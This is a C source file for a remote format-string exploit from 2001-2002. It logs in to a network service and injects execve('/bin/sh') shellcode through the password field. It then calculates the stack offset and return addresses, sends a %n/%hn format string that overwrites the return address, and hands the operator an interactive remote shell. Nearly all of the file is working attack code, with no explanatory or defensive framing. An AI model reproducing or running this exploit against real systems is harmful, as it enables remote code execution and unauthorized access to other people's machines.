/*
 * Copyright (C) 2001, 2002 Pappy.
 * Copyright (C) 2001, 2002 Zorgon.
 * All rights reserved.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <getopt.h>
#include "fmtb.h"

/* example */
#define HOST "127.0.0.1"
#define PORT 12345
#define LOGIN "foobar"
#define ADDR_STACK 0xbfffd001

#define VERSION "0.3"
#define QUIT "quit"

char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main( int argc, char * argv[] )
{
  char buf[1024];
  int sd, i, length;
  string_t p_string;
  int ( *build_fmt )( string_t * p_string ) = build_n;

  printf( "Format string builder %s\n\n", VERSION );

  /* connect to the remote server */
  printf( "[+] Connect to %s:%d...\n", HOST, PORT );
  sd = sock_connect( HOST, PORT );
  if ( sd < 0 ) {
    return( -1 );
  }

  /* send login */
  printf( "[+] Send login...\n" );	
  memset( buf, '\x00', sizeof(buf) );
  read( sd, buf, sizeof(buf) );
  strcpy( buf, LOGIN );
  write( sd, buf, strlen(buf) );

  /* passwd: shellcode in the buffer and in the remote stack */
  printf( "[+] Passwd: shellcode in the buffer and in the remote stack\n" );
  read( sd, buf, sizeof(buf) );
  write( sd, shellcode, strlen(shellcode) );

  /* find offset */
  printf( "[+] Find offset...\n" );
  p_string.offset = get_offset_remote( sd );
  if ( p_string.offset == 0 ) {
    printf( "[-] Can't calculate offset...\n" );
    printf( "[-] Exit...\n" );
    return( -1 );
  }
  printf( "\toffset=%d\n", p_string.offset );

  /* return adress and shellcode adress */
  printf( "[+] Calculate local and return addresses...\n" );
  get_addr_remote( sd, &p_string, shellcode, ADDR_STACK );

  if (p_string.locaddr == -1 ) {
    printf( "[-] Can't calculate local address...\n" );
    printf( "[-] Exit...\n" );
    return( -1 );
  }
  printf( "\tlocaddr = 0x%08x\n", p_string.locaddr );

  if (p_string.retaddr == -1 ) {
    printf( "[-] Can't calculate return address...\n" );
    printf( "[-] Exit...\n" );
    return( -1 );
  }
  printf( "\tretaddr = 0x%08x\n", p_string.retaddr );

  /* send the format string */
  printf( "[+] Building the fmt string...\n" );
  p_string.fmt = malloc( MAX_FMT_LENGTH );
  p_string.base = 0;
  p_string.pad = 0;
 
  /* create the string */
  length = build_fmt( &p_string );
  if ( length == -1 ) {
    build_fmt = build_hn;
    length = build_fmt( &p_string );
    if ( length == -1 ) {
      printf( "[-] Can't building format string...\n" );
      printf( "[-] Exit...\n" );
      return( -1 );
    }
  }
  printf( "[+] Building completed...\n" );

  write(sd, p_string.fmt, strlen(p_string.fmt));
  sleep(1);
  read(sd, buf, sizeof(buf));

  /* call the return while quiting */
  printf( "[+] Sending the quit...\n");
  strcpy( buf, QUIT );
  write(sd, buf, strlen(buf));
  sleep(1);
	
  printf( "[+] Give me a shell...\n\n" );
  i = interact( sd );
  if ( i ) {
    return( -1 );
  }

  /* close connection */
  close( sd );
  return( 0 );
}
